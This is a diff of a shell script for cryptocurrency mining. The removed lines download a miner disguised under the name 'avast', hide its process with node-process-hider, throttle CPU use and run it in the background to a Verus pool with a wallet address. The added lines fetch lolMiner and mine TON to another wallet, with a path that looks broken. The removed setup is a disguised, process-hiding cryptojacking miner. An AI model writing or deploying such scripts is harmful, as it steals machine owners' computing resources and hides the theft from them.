@@ -1,15 +1,6 @@
 #!/bin/sh
 
-apt update && apt -y install sudo
-sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-sudo apt-get install -y nodejs
-sudo apt-get install gcc g++ make
-sudo -u root npm i -g node-process-hider
-sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-sudo dpkg-reconfigure --frontend noninteractive tzdata
-wget https://github.com/aurbach55/toya/raw/main/avast
-ph add avast
-cpulimit -e kopi -l 30 &
-chmod +x avast  >/dev/null 2>&1
-nohup ./avast -v -l  pool.verus.io:9999 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.T -t 2 -x > nohup.out
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz
+tar xvf lolMiner_v1.42_Lin64.tar.gz
+cd 1.42
+/lolMiner --algo TON --pool https://server1.whalestonpool.com --user EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF
